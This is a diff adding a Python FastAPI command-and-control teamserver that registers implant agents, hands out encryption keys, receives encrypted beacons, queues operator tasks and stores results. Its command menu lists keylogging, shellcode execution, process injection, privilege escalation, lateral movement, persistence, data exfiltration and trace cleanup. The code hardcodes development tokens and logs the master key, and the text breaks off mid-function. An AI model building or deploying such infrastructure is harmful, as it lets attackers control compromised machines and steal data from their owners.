@@ -1,0 +1,1390 @@
+# internal_c2_server_fixed.py
+"""
+Internal C2 server with teamserver capabilities
+Complete end-to-end tasking pipeline with all fixes applied
+No external dependencies beyond standard library
+"""
+
+from fastapi import FastAPI, Request, HTTPException, Depends, WebSocket, WebSocketDisconnect
+from fastapi.middleware.cors import CORSMiddleware
+from fastapi.responses import JSONResponse
+from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
+import uvicorn
+import logging
+import json
+import sqlite3
+import uuid
+from datetime import datetime, timedelta, timezone
+from typing import Dict, List, Optional, Tuple
+import asyncio
+from cryptography.fernet import Fernet, InvalidToken
+import random
+import base64
+import atexit
+import signal
+import threading
+import time
+import os
+import traceback
+
+logging.basicConfig(level=logging.DEBUG)
+logger = logging.getLogger(__name__)
+
+security = HTTPBearer()
+
+# Thread lock for synchronous DB operations
+THREAD_DB_LOCK = threading.Lock()
+
+# Development tokens for testing
+DEV_TOKENS = {
+    "dev-token-123",
+    "testtoken",
+    "agent-secret-key-2024",
+}
+
+
+class InternalC2Server:
+    """Internal C2 server with teamserver features and complete tasking pipeline"""
+
+    def __init__(self, server_id: str, config: Dict):
+        self.server_id = server_id
+        self.config = config
+        self.active_sessions = {}
+        self.team_members = {}
+
+        # Master key
+        self.master_key_file = "master.key"
+        if os.path.exists(self.master_key_file):
+            with open(self.master_key_file, "rb") as f:
+                self.master_key = f.read()
+            logger.info(f"Loaded master key from {self.master_key_file}")
+        else:
+            self.master_key = Fernet.generate_key()
+            with open(self.master_key_file, "wb") as f:
+                f.write(self.master_key)
+            logger.info(f"Generated new master key and saved to {self.master_key_file}")
+
+        self.master_cipher = Fernet(self.master_key)
+        self.agent_keys = {}
+        self.db_path = config.get("database_path", "teamserver.db")
+        self.websocket_connections = []
+        self.bg_tasks = []
+        self.db_write_lock = asyncio.Lock()
+        self.is_shutting_down = False
+
+        # Register cleanup handlers
+        atexit.register(self._cleanup_resources)
+        signal.signal(signal.SIGTERM, self._signal_handler)
+        signal.signal(signal.SIGINT, self._signal_handler)
+
+        # Available commands
+        self.available_commands = {
+            "shell": "Execute shell command",
+            "sysinfo": "Get system information",
+            "ls": "List directory contents",
+            "pwd": "Print working directory",
+            "whoami": "Get current user",
+            "ps": "List running processes",
+            "download": "Download file from agent",
+            "upload": "Upload file to agent",
+            "persistence": "Establish persistence",
+            "keylogger": "Start/stop keylogger",
+            "screenshot": "Take screenshot",
+            "shellcode": "Execute shellcode",
+            "inject": "Inject into process",
+            "privilege": "Privilege escalation",
+            "lateral": "Lateral movement",
+            "exfil": "Exfiltrate data",
+            "cleanup": "Clean up traces"
+        }
+
+        # Create FastAPI app
+        self.app = FastAPI(
+            title="Internal C2 TeamServer",
+            docs_url="/docs",
+            redoc_url="/redoc",
+            openapi_url="/openapi.json",
+        )
+
+        # Setup startup and shutdown events
+        @self.app.on_event("startup")
+        async def startup_event():
+            logger.info("Starting up C2 server...")
+            self._init_database_safe()
+            self._load_agent_keys()
+
+            # Start background tasks
+            self.bg_tasks = [
+                asyncio.create_task(self._cleanup_old_sessions_loop()),
+                asyncio.create_task(self._update_agent_status_loop()),
+                asyncio.create_task(self._broadcast_status_updates()),
+                asyncio.create_task(self._cleanup_old_tasks_loop())
+            ]
+
+            logger.info(f"🔐 Master key: {base64.b64encode(self.master_key).decode()}")
+            logger.info("Startup complete")
+
+        @self.app.on_event("shutdown")
+        async def shutdown_event():
+            logger.info("Shutting down...")
+            self.is_shutting_down = True
+            for task in self.bg_tasks:
+                task.cancel()
+            if self.bg_tasks:
+                await asyncio.gather(*self.bg_tasks, return_exceptions=True)
+            logger.info("Shutdown complete")
+
+        self._setup_middleware()
+        self._setup_routes()
+        self._setup_websocket()
+        self._setup_team_websocket()
+
+    def start(self, host="0.0.0.0", port=8443):
+        """Start the C2 server"""
+        logger.info(f"Starting Internal C2 Server {self.server_id} on {host}:{port}")
+        uvicorn.run(self.app, host=host, port=port)
+
+    # -------------------
+    # Resource Management
+    # -------------------
+    def _cleanup_resources(self, *args):
+        logger.info("Cleaning up resources...")
+
+    def _signal_handler(self, signum, frame):
+        logger.info(f"Received signal {signum}, cleaning up...")
+        self._cleanup_resources()
+        exit(0)
+
+    # -------------------
+    # Database Helper
+    # -------------------
+    def get_db(self):
+        """Get a fresh SQLite connection"""
+        try:
+            conn = sqlite3.connect(self.db_path, timeout=30, check_same_thread=False)
+            conn.execute("PRAGMA journal_mode=WAL;")
+            conn.execute("PRAGMA synchronous=NORMAL;")
+            conn.execute("PRAGMA busy_timeout=30000;")
+            conn.execute("PRAGMA foreign_keys=ON;")
+            conn.execute("PRAGMA wal_autocheckpoint=100;")
+            conn.row_factory = sqlite3.Row
+            return conn
+        except Exception as e:
+            logger.error(f"Database connection error: {e}")
+            raise
+
+    # -------------------
+    # Database Initialization
+    # -------------------
+    def _init_database_safe(self):
+        """Initialize database schema"""
+        logger.info("Initializing database schema...")
+        try:
+            conn = sqlite3.connect(self.db_path, timeout=30, check_same_thread=False)
+            c = conn.cursor()
+
+            # Create tables
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS agents (
+                    id TEXT PRIMARY KEY,
+                    hostname TEXT,
+                    username TEXT,
+                    ip_address TEXT,
+                    os TEXT,
+                    arch TEXT,
+                    process_id INTEGER,
+                    first_seen TIMESTAMP,
+                    last_seen TIMESTAMP,
+                    status TEXT,
+                    encryption_key TEXT,
+                    encrypted INTEGER DEFAULT 0,
+                    tags TEXT,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            ''')
+
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS tasks (
+                    id TEXT PRIMARY KEY,
+                    agent_id TEXT,
+                    operator_id TEXT,
+                    command TEXT,
+                    args TEXT,
+                    result TEXT,
+                    error TEXT,
+                    exit_code INTEGER,
+                    status TEXT,
+                    priority INTEGER DEFAULT 1,
+                    created_at TIMESTAMP,
+                    dispatched_at TIMESTAMP,
+                    executed_at TIMESTAMP,
+                    FOREIGN KEY (agent_id) REFERENCES agents (id) ON DELETE CASCADE
+                )
+            ''')
+
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS operators (
+                    id TEXT PRIMARY KEY,
+                    username TEXT,
+                    is_active INTEGER DEFAULT 1,
+                    last_login TIMESTAMP,
+                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+                )
+            ''')
+
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS results (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    agent_id TEXT,
+                    task_id TEXT,
+                    output TEXT,
+                    exit_code INTEGER,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    FOREIGN KEY (agent_id) REFERENCES agents (id) ON DELETE CASCADE,
+                    FOREIGN KEY (task_id) REFERENCES tasks (id) ON DELETE CASCADE
+                )
+            ''')
+
+            c.execute('''
+                CREATE TABLE IF NOT EXISTS session_logs (
+                    id INTEGER PRIMARY KEY AUTOINCREMENT,
+                    agent_id TEXT,
+                    action TEXT,
+                    details TEXT,
+                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
+                    FOREIGN KEY (agent_id) REFERENCES agents (id) ON DELETE CASCADE
+                )
+            ''')
+
+            # Create indices
+            c.execute('CREATE INDEX IF NOT EXISTS idx_agents_status ON agents(status)')
+            c.execute('CREATE INDEX IF NOT EXISTS idx_agents_last_seen ON agents(last_seen)')
+            c.execute('CREATE INDEX IF NOT EXISTS idx_tasks_agent_status ON tasks(agent_id, status)')
+            c.execute('CREATE INDEX IF NOT EXISTS idx_tasks_created_at ON tasks(created_at)')
+            c.execute('CREATE INDEX IF NOT EXISTS idx_tasks_executed_at ON tasks(executed_at)')
+            c.execute('CREATE INDEX IF NOT EXISTS idx_results_timestamp ON results(timestamp)')
+            c.execute('CREATE INDEX IF NOT EXISTS idx_session_logs_timestamp ON session_logs(timestamp)')
+
+            # Insert default operator
+            c.execute("INSERT OR IGNORE INTO operators (id, username) VALUES (?, ?)",
+                      ("operator-01", "admin"))
+
+            conn.commit()
+            conn.close()
+            logger.info("Database schema initialized successfully")
+        except Exception as e:
+            logger.error(f"Error initializing database schema: {e}")
+            logger.warning("Server will continue with limited database functionality")
+
+    # -------------------
+    # Agent Registration
+    # -------------------
+    def _register_agent_to_db(self, agent_id, hostname, username, ip_address, os, arch,
+                             process_id, encryption_key, tags=None):
+        with THREAD_DB_LOCK:
+            conn = self.get_db()
+            cursor = conn.cursor()
+            cursor.execute("""
+                INSERT OR REPLACE INTO agents
+                (id, hostname, username, ip_address, os, arch, process_id,
+                 first_seen, last_seen, status, encryption_key, tags)
+                VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
+            """, (
+                agent_id,
+                hostname,
+                username,
+                ip_address,
+                os,
+                arch,
+                process_id,
+                self._now_iso(),
+                self._now_iso(),
+                "online",
+                encryption_key,
+                json.dumps(tags or {})
+            ))
+            conn.commit()
+            conn.close()
+
+    # -------------------
+    # Agent Key Management - FIXED with enhanced debugging
+    # -------------------
+    def _load_agent_keys(self):
+        """Load persisted agent keys from database"""
+        try:
+            conn = self.get_db()
+            c = conn.cursor()
+            c.execute("SELECT id, encryption_key FROM agents WHERE encryption_key IS NOT NULL")
+
+            loaded_keys = 0
+            for agent_id, encrypted_key in c.fetchall():
+                try:
+                    if encrypted_key:
+                        agent_key = base64.b64decode(encrypted_key)
+                        agent_cipher = Fernet(agent_key)
+                        self.agent_keys[agent_id] = (agent_key, agent_cipher)
+                        loaded_keys += 1
+                        logger.debug(f"Loaded key for agent {agent_id}")
+                except Exception as e:
+                    logger.error(f"Failed to load key for agent {agent_id}: {e}")
+            conn.close()
+            logger.info(f"Loaded {loaded_keys} agent keys from database")
+        except Exception as e:
+            logger.error(f"Error loading agent keys: {e}")
+
+    def _reload_agent_key(self, agent_id: str) -> bool:
+        """Reload a specific agent key from database"""
+        try:
+            logger.debug(f"Reloading key for agent {agent_id} from database")
+            conn = self.get_db()
+            c = conn.cursor()
+            c.execute("SELECT encryption_key FROM agents WHERE id = ?", (agent_id,))
+            row = c.fetchone()
+            conn.close()
+
+            if row and row[0]:
+                logger.debug(f"Found key in database for {agent_id}: {row[0][:30]}...")
+                agent_key = base64.b64decode(row[0])
+                logger.debug(f"Decoded key length: {len(agent_key)} bytes")
+                agent_cipher = Fernet(agent_key)
+                self.agent_keys[agent_id] = (agent_key, agent_cipher)
+                logger.info(f"Successfully reloaded key for agent {agent_id} from database")
+                return True
+            else:
+                logger.debug(f"No key found in database for agent {agent_id}")
+        except Exception as e:
+            logger.error(f"Error reloading key for agent {agent_id}: {e}")
+        return False
+
+    def _save_agent_key(self, agent_id: str, agent_key: bytes):
+        try:
+            with THREAD_DB_LOCK:
+                conn = self.get_db()
+                c = conn.cursor()
+                c.execute(
+                    "UPDATE agents SET encryption_key = ? WHERE id = ?",
+                    (base64.b64encode(agent_key).decode(), agent_id)
+                )
+                conn.commit()
+                conn.close()
+        except Exception as e:
+            logger.error(f"Error saving agent key: {e}")
+
+    # -------------------
+    # Async Database Write Helper
+    # -------------------
+    async def _execute_write(self, query: str, params: tuple = ()):
+        async with self.db_write_lock:
+            try:
+                loop = asyncio.get_event_loop()
+                await loop.run_in_executor(
+                    None,
+                    self._sync_execute_write,
+                    query,
+                    params
+                )
+            except Exception as e:
+                logger.error(f"Async write error: {e}")
+                raise
+
+    def _sync_execute_write(self, query: str, params: tuple):
+        conn = None
+        try:
+            conn = self.get_db()
+            cursor = conn.cursor()
+            cursor.execute(query, params)
+            conn.commit()
+        except Exception as e:
+            logger.error(f"Sync write error: {e}")
+            raise
+        finally:
+            if conn:
+                conn.close()
+
+    async def _execute_write_many(self, query: str, params_list: list):
+        if not params_list:
+            return
+        async with self.db_write_lock:
+            try:
+                loop = asyncio.get_event_loop()
+                await loop.run_in_executor(
+                    None,
+                    self._sync_execute_write_many,
+                    query,
+                    params_list
+                )
+            except Exception as e:
+                logger.error(f"Async write many error: {e}")
+                raise
+
+    def _sync_execute_write_many(self, query: str, params_list: list):
+        conn = None
+        try:
+            conn = self.get_db()
+            cursor = conn.cursor()
+            cursor.executemany(query, params_list)
+            conn.commit()
+        except Exception as e:
+            logger.error(f"Sync write many error: {e}")
+            raise
+        finally:
+            if conn:
+                conn.close()
+
+    # -------------------
+    # Utility Methods
+    # -------------------
+    def _now(self):
+        return datetime.now(timezone.utc)
+
+    def _now_iso(self):
+        return self._now().isoformat()
+
+    def _parse_iso(self, iso_string: str) -> datetime:
+        try:
+            if iso_string.endswith('Z'):
+                iso_string = iso_string[:-1] + '+00:00'
+            try:
+                dt = datetime.fromisoformat(iso_string)
+            except ValueError:
+                if '.' in iso_string:
+                    parts = iso_string.split('.')
+                    iso_string = parts[0] + '.' + parts[1][:6]
+                    dt = datetime.fromisoformat(iso_string)
+                else:
+                    raise
+            if dt.tzinfo is None:
+                dt = dt.replace(tzinfo=timezone.utc)
+            return dt
+        except Exception as e:
+            logger.error(f"Error parsing ISO datetime {iso_string}: {e}")
+            return self._now()
+
+    # -------------------
+    # Decryption - FIXED with enhanced debugging
+    # -------------------
+    def _decrypt_agent_payload(self, encrypted_data: str, agent_id: Optional[str] = None) -> Dict:
+        try:
+            encrypted_payload = base64.b64decode(encrypted_data.encode())
+            logger.debug(f"Decrypting payload for agent {agent_id}, payload length: {len(encrypted_payload)}")
+
+            # Try agent-specific key first
+            if agent_id:
+                logger.debug(f"Attempting to decrypt for agent {agent_id}")
+                logger.debug(f"Keys in memory: {list(self.agent_keys.keys())}")
+
+                # Check if we have the key in memory
+                if agent_id in self.agent_keys:
+                    _, agent_cipher = self.agent_keys[agent_id]
+                    logger.debug(f"Found key for agent {agent_id} in memory")
+                    try:
+                        decrypted = agent_cipher.decrypt(encrypted_payload)
+                        logger.debug(f"Successfully decrypted with agent key for {agent_id}")
+                        return json.loads(decrypted.decode())
+                    except InvalidToken as e:
+                        logger.debug(f"Agent key decryption failed for {agent_id}: {e}")
+                        logger.debug("Key might be corrupted or mismatched")
+                        # Try to reload from database
+                        logger.debug(f"Attempting to reload key from database for {agent_id}")
+                        if self._reload_agent_key(agent_id):
+                            logger.debug(f"Successfully reloaded key for {agent_id}")
+                            _, agent_cipher = self.agent_keys[agent_id]
+                            decrypted = agent_cipher.decrypt(encrypted_payload)
+                            return json.loads(decrypted.decode())
+                        else:
+                            logger.debug(f"Failed to reload key for {agent_id} from database")
+                else:
+                    logger.debug(f"No key found for agent {agent_id} in memory, trying database")
+                    # Try to load from database
+                    if self._reload_agent_key(agent_id):
+                        logger.debug(f"Successfully loaded key for {agent_id} from database")
+                        _, agent_cipher = self.agent_keys[agent_id]
+                        decrypted = agent_cipher.decrypt(encrypted_payload)
+                        return json.loads(decrypted.decode())
+                    else:
+                        logger.debug(f"No key found in database for agent {agent_id}")
+
+            # Fall back to master key
+            logger.debug("Falling back to master key")
+            decrypted = self.master_cipher.decrypt(encrypted_payload)
+            return json.loads(decrypted.decode())
+
+        except Exception as e:
+            logger.error(f"Decryption error: {e}")
+            logger.error(f"Error type: {type(e).__name__}")
+            logger.error(f"Traceback: {traceback.format_exc()}")
+            raise HTTPException(status_code=400, detail="Decryption failed")
+
+    # -------------------
+    # Routes - Enhanced C2 Endpoints
+    # -------------------
+    def _setup_routes(self):
+        @self.app.get("/health")
+        async def health_check():
+            return {
+                "status": "healthy",
+                "server_id": self.server_id,
+                "timestamp": self._now_iso(),
+                "active_sessions": len(self.active_sessions),
+                "team_members": len(self.team_members),
+                "agent_keys_loaded": len(self.agent_keys)
+            }
+
+        @self.app.get("/api/v1/commands")
+        async def get_available_commands(credentials: HTTPAuthorizationCredentials = Depends(security)):
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+            return {
+                "commands": self.available_commands,
+                "count": len(self.available_commands)
+            }
+
+        @self.app.post("/api/v1/register")
+        async def register_agent(request: Request):
+            try:
+                data = await request.json()
+                agent_id = data.get("agent_id") or f"agent-{str(uuid.uuid4())[:8]}"
+
+                agent_key = Fernet.generate_key()
+                agent_cipher = Fernet(agent_key)
+
+                # Store in memory
+                self.agent_keys[agent_id] = (agent_key, agent_cipher)
+                logger.debug(f"Stored key for agent {agent_id} in memory")
+                logger.debug(f"Agent key (base64): {base64.b64encode(agent_key).decode()[:50]}...")
+
+                # Save to database
+                key_b64 = base64.b64encode(agent_key).decode()
+                logger.debug(f"Saving key to database: {key_b64[:50]}...")
+
+                self._register_agent_to_db(
+                    agent_id=agent_id,
+                    hostname=data.get("hostname", "unknown"),
+                    username=data.get("username", "unknown"),
+                    ip_address=request.client.host,
+                    os=data.get("os", "unknown"),
+                    arch=data.get("arch", "unknown"),
+                    process_id=data.get("process_id", 0),
+                    encryption_key=key_b64,
+                    tags=data.get("tags", {})
+                )
+
+                # Verify it was saved
+                conn = self.get_db()
+                c = conn.cursor()
+                c.execute("SELECT encryption_key FROM agents WHERE id = ?", (agent_id,))
+                saved_key = c.fetchone()
+                conn.close()
+
+                if saved_key and saved_key[0]:
+                    logger.debug(f"Verified key saved in database: {saved_key[0][:50]}...")
+                else:
+                    logger.error(f"Failed to verify key save for agent {agent_id}")
+
+                self._update_session(agent_id, request.client.host, "registered")
+                logger.info(f"Registered new agent {agent_id} from {request.client.host}")
+
+                response = {
+                    "agent_id": agent_id,
+                    "encryption_key": key_b64,
+                    "sleep": random.randint(20, 60),
+                    "c2_endpoints": self.config.get("alternate_endpoints", []),
+                    "server_id": self.server_id,
+                    "commands": list(self.available_commands.keys())
+                }
+
+                encrypted_response = self.master_cipher.encrypt(json.dumps(response).encode())
+                return {
+                    "encrypted": True,
+                    "payload": base64.b64encode(encrypted_response).decode()
+                }
+            except Exception as e:
+                logger.error(f"Registration error: {e}")
+                logger.error(f"Traceback: {traceback.format_exc()}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.post("/api/v1/beacon")
+        async def beacon_endpoint(
+            request: Request,
+            credentials: HTTPAuthorizationCredentials = Depends(security),
+        ):
+            try:
+                data = await request.json()
+                agent_token = credentials.credentials
+
+                if not self._verify_agent_token(agent_token):
+                    raise HTTPException(status_code=401, detail="Invalid agent token")
+
+                if data.get("encrypted"):
+                    agent_id = data.get("agent_id")
+                    try:
+                        agent_data = self._decrypt_agent_payload(data["payload"], agent_id)
+                    except Exception as e:
+                        logger.error(f"Decryption error: {e}")
+                        raise HTTPException(status_code=400, detail="Decryption failed")
+                else:
+                    agent_data = data
+
+                agent_id = agent_data.get("agent_id")
+                if not agent_id:
+                    raise HTTPException(status_code=400, detail="Missing agent_id")
+
+                # WRITE operation with async lock
+                await self._execute_write("""
+                    UPDATE agents
+                    SET hostname = ?, username = ?, ip_address = ?, os = ?, arch = ?,
+                        process_id = ?, last_seen = ?, status = ?
+                    WHERE id = ?
+                """, (
+                    agent_data.get("hostname", "unknown"),
+                    agent_data.get("username", "unknown"),
+                    request.client.host,
+                    agent_data.get("os", "unknown"),
+                    agent_data.get("arch", "unknown"),
+                    agent_data.get("process_id", 0),
+                    self._now_iso(),
+                    "online",
+                    agent_id
+                ))
+
+                # READ operation - separate connection
+                tasks = await self._get_pending_tasks_async(agent_id)
+
+                self._update_session(agent_id, request.client.host, "active")
+                logger.info(f"Beacon received from {agent_id} @ {request.client.host} - {len(tasks)} tasks pending")
+
+                response = {
+                    "status": "ok",
+                    "server_id": self.server_id,
+                    "tasks": tasks,
+                    "next_beacon": random.randint(20, 60),
+                    "timestamp": self._now_iso(),
+                    "message": f"{len(tasks)} tasks pending" if tasks else "No tasks"
+                }
+
+                if agent_id in self.agent_keys:
+                    _, agent_cipher = self.agent_keys[agent_id]
+                    encrypted_resp = agent_cipher.encrypt(json.dumps(response).encode())
+                    return {
+                        "encrypted": True,
+                        "payload": base64.b64encode(encrypted_resp).decode()
+                    }
+                else:
+                    return response
+
+            except HTTPException:
+                raise
+            except Exception as e:
+                logger.error(f"Beacon error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.post("/api/v1/result")
+        async def post_result(request: Request):
+            try:
+                data = await request.json()
+                logger.debug(f"Received result data keys: {data.keys()}")
+                logger.debug(f"Full result data: {data}")
+
+                if data.get("encrypted"):
+                    # Try to get agent_id from multiple places
+                    agent_id = data.get("agent_id")
+
+                    # If not in outer JSON, try to extract from encrypted payload with master key
+                    if not agent_id:
+                        logger.debug("No agent_id in outer JSON, attempting to extract from payload")
+                        try:
+                            # Try to decrypt with master key just to get agent_id
+                            temp_decrypted = self.master_cipher.decrypt(base64.b64decode(data["payload"]))
+                            temp_data = json.loads(temp_decrypted.decode())
+                            agent_id = temp_data.get("agent_id")
+                            logger.debug(f"Extracted agent_id from payload: {agent_id}")
+                        except Exception as e:
+                            logger.error(f"Failed to extract agent_id from payload: {e}")
+
+                    if not agent_id:
+                        logger.error("Could not determine agent_id for result")
+                        raise HTTPException(status_code=400, detail="Missing agent_id")
+
+                    logger.debug(f"Decrypting result for agent {agent_id}")
+
+                    # Decrypt with agent key
+                    result_data = self._decrypt_agent_payload(data["payload"], agent_id)
+                    if not result_data:
+                        raise HTTPException(status_code=400, detail="Decryption failed")
+                else:
+                    result_data = data
+
+                task_id = result_data.get("task_id")
+                agent_id = result_data.get("agent_id")
+                output = result_data.get("output", "")
+                exit_code = result_data.get("exit_code", 0)
+                error = result_data.get("error", "")
+
+                if not all([task_id, agent_id]):
+                    raise HTTPException(status_code=400, detail="Missing required fields")
+
+                logger.debug(f"Processing result for task {task_id} from agent {agent_id}")
+
+                # WRITE operation 1 - Update task result
+                await self._execute_write("""
+                    UPDATE tasks
+                    SET result = ?, error = ?, exit_code = ?,
+                        status = 'completed', executed_at = ?
+                    WHERE id = ? AND agent_id = ?
+                """, (
+                    output[:1000000],
+                    error[:10000],
+                    exit_code,
+                    self._now_iso(),
+                    task_id,
+                    agent_id
+                ))
+
+                # WRITE operation 2 - Update agent last seen
+                await self._execute_write("""
+                    UPDATE agents
+                    SET last_seen = ?, status = 'online'
+                    WHERE id = ?
+                """, (self._now_iso(), agent_id))
+
+                self._update_session(agent_id, request.client.host, "result_submitted")
+                logger.info(f"Result received for task {task_id} from agent {agent_id}")
+
+                await self._broadcast_to_team({
+                    'type': 'task_completed',
+                    'task_id': task_id,
+                    'agent_id': agent_id,
+                    'exit_code': exit_code,
+                    'timestamp': self._now_iso(),
+                    'has_error': bool(error)
+                })
+
+                return {"status": "ok", "message": "Result recorded"}
+
+            except HTTPException:
+                raise
+            except Exception as e:
+                logger.error(f"Result submission error: {e}")
+                logger.error(f"Traceback: {traceback.format_exc()}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.post("/api/v1/task")
+        async def create_task(
+            request: Request,
+            credentials: HTTPAuthorizationCredentials = Depends(security)
+        ):
+            try:
+                data = await request.json()
+
+                if not self._verify_operator_token(credentials.credentials):
+                    raise HTTPException(status_code=401, detail="Invalid operator token")
+
+                agent_id = data.get("agent_id")
+                command = data.get("command")
+                args = data.get("args", [])
+                operator_id = data.get("operator_id", "operator-01")
+                priority = data.get("priority", 1)
+
+                if not agent_id or not command:
+                    raise HTTPException(status_code=400, detail="agent_id and command required")
+
+                if command not in self.available_commands:
+                    logger.warning(f"Unknown command '{command}' requested")
+
+                task_id = str(uuid.uuid4())
+
+                # WRITE operation
+                await self._execute_write("""
+                    INSERT INTO tasks
+                    (id, agent_id, operator_id, command, args, created_at, status, priority)
+                    VALUES (?, ?, ?, ?, ?, ?, 'pending', ?)
+                """, (
+                    task_id,
+                    agent_id,
+                    operator_id,
+                    command,
+                    json.dumps(args),
+                    self._now_iso(),
+                    priority
+                ))
+
+                logger.info(f"Queued task {command} for agent {agent_id} (task_id: {task_id})")
+
+                await self._broadcast_to_team({
+                    'type': 'task_created',
+                    'task_id': task_id,
+                    'agent_id': agent_id,
+                    'command': command,
+                    'args': args,
+                    'operator_id': operator_id,
+                    'priority': priority,
+                    'timestamp': self._now_iso()
+                })
+
+                return {
+                    "status": "queued",
+                    "task_id": task_id,
+                    "message": f"Task queued for agent {agent_id}"
+                }
+
+            except Exception as e:
+                logger.error(f"Task creation error: {e}")
+                raise HTTPException(status_code=500, detail=str(e))
+
+        @self.app.get("/api/v1/agents")
+        async def get_agents(credentials: HTTPAuthorizationCredentials = Depends(security)):
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            # READ operation - no lock needed
+            conn = self.get_db()
+            conn.row_factory = sqlite3.Row
+            c = conn.cursor()
+            c.execute('SELECT * FROM agents ORDER BY last_seen DESC')
+            agents = [dict(row) for row in c.fetchall()]
+
+            # Get task counts for each agent
+            for agent in agents:
+                agent_id = agent['id']
+                c.execute("""
+                    SELECT COUNT(*) as total,
+                           SUM(CASE WHEN status = 'pending' OR status = 'dispatched' THEN 1 ELSE 0 END) as pending,
+                           SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) as completed
+                    FROM tasks
+                    WHERE agent_id = ?
+                """, (agent_id,))
+                task_stats = c.fetchone()
+                agent['tasks_total'] = task_stats[0] or 0
+                agent['tasks_pending'] = task_stats[1] or 0
+                agent['tasks_completed'] = task_stats[2] or 0
+
+            conn.close()
+
+            for agent in agents:
+                agent_id = agent['id']
+                if agent_id in self.active_sessions:
+                    session = self.active_sessions[agent_id]
+                    agent['session_status'] = session.get('status', 'unknown')
+                    agent['session_last_seen'] = session.get('last_seen')
+                else:
+                    agent['session_status'] = 'offline'
+                    agent['session_last_seen'] = None
+
+                if 'last_seen' in agent and agent['last_seen']:
+                    try:
+                        last_seen = self._parse_iso(agent['last_seen'])
+                        if self._now() - last_seen < timedelta(seconds=120):
+                            agent['status'] = 'online'
+                        else:
+                            agent['status'] = 'offline'
+                    except:
+                        agent['status'] = 'unknown'
+                else:
+                    agent['status'] = 'unknown'
+
+            return {'agents': agents}
+
+        @self.app.get("/api/v1/tasks")
+        async def get_tasks(
+            agent_id: Optional[str] = None,
+            status: Optional[str] = None,
+            limit: int = 50,
+            credentials: HTTPAuthorizationCredentials = Depends(security)
+        ):
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            # READ operation - no lock needed
+            conn = self.get_db()
+            conn.row_factory = sqlite3.Row
+            c = conn.cursor()
+
+            query = "SELECT * FROM tasks"
+            params = []
+            conditions = []
+
+            if agent_id:
+                conditions.append("agent_id = ?")
+                params.append(agent_id)
+            if status:
+                conditions.append("status = ?")
+                params.append(status)
+
+            if conditions:
+                query += " WHERE " + " AND ".join(conditions)
+
+            query += " ORDER BY created_at DESC LIMIT ?"
+            params.append(limit)
+
+            c.execute(query, params)
+            tasks = [dict(row) for row in c.fetchall()]
+
+            for task in tasks:
+                if task.get('args'):
+                    try:
+                        task['args'] = json.loads(task['args'])
+                    except:
+                        task['args'] = []
+
+            conn.close()
+
+            return {
+                'tasks': tasks,
+                'count': len(tasks),
+                'filters': {
+                    'agent_id': agent_id,
+                    'status': status
+                }
+            }
+
+        @self.app.get("/api/v1/sessions")
+        async def get_sessions(credentials: HTTPAuthorizationCredentials = Depends(security)):
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            online_sessions = [s for s in self.active_sessions.values() if s.get('status') in ['active', 'registered']]
+            offline_sessions = [s for s in self.active_sessions.values() if s.get('status') == 'offline']
+
+            return {
+                'sessions': self.active_sessions,
+                'statistics': {
+                    'total': len(self.active_sessions),
+                    'online': len(online_sessions),
+                    'offline': len(offline_sessions),
+                    'registered': len([s for s in self.active_sessions.values() if s.get('status') == 'registered'])
+                }
+            }
+
+        @self.app.delete("/api/v1/task/{task_id}")
+        async def delete_task(
+            task_id: str,
+            credentials: HTTPAuthorizationCredentials = Depends(security)
+        ):
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            # WRITE operation
+            await self._execute_write("DELETE FROM tasks WHERE id = ?", (task_id,))
+
+            logger.info(f"Deleted task {task_id}")
+            return {"status": "deleted", "task_id": task_id}
+
+        @self.app.get("/api/v1/dashboard")
+        async def get_dashboard(credentials: HTTPAuthorizationCredentials = Depends(security)):
+            if not self._verify_operator_token(credentials.credentials):
+                raise HTTPException(status_code=401, detail="Invalid operator token")
+
+            # READ operation - no lock needed
+            conn = self.get_db()
+            c = conn.cursor()
+            c.execute("SELECT COUNT(*) as total, SUM(CASE WHEN status = 'online' THEN 1 ELSE 0 END) as online FROM agents")
+            agent_stats = c.fetchone()
+            c.execute("""
+                SELECT
+                    COUNT(*) as total,
+                    SUM(CASE WHEN status = 'pending' OR status = 'dispatched' THEN 1 ELSE 0 END) as pending,
+                    SUM(CASE WHEN status = 'completed' THEN 1 ELSE 0 END) as completed,
+                    SUM(CASE WHEN status = 'failed' THEN 1 ELSE 0 END) as failed
+                FROM tasks
+            """)
+            task_stats = c.fetchone()
+            c.execute("""
+                SELECT command, COUNT(*) as count
+                FROM tasks
+                WHERE executed_at > datetime('now', '-1 hour')
+                GROUP BY command
+                ORDER BY count DESC
+                LIMIT 5
+            """)
+            recent_commands = c.fetchall()
+            conn.close()
+
+            return {
+                "dashboard": {
+                    "agents": {
+                        "total": agent_stats[0] or 0,
+                        "online": agent_stats[1] or 0,
+                        "offline": (agent_stats[0] or 0) - (agent_stats[1] or 0)
+                    },
+                    "tasks": {
+                        "total": task_stats[0] or 0,
+                        "pending": task_stats[1] or 0,
+                        "completed": task_stats[2] or 0,
+                        "failed": task_stats[3] or 0
+                    },
+                    "sessions": {
+                        "active": len(self.active_sessions),
+                        "websockets": len(self.websocket_connections)
+                    },
+                    "recent_commands": [
+                        {"command": cmd[0], "count": cmd[1]}
+                        for cmd in recent_commands
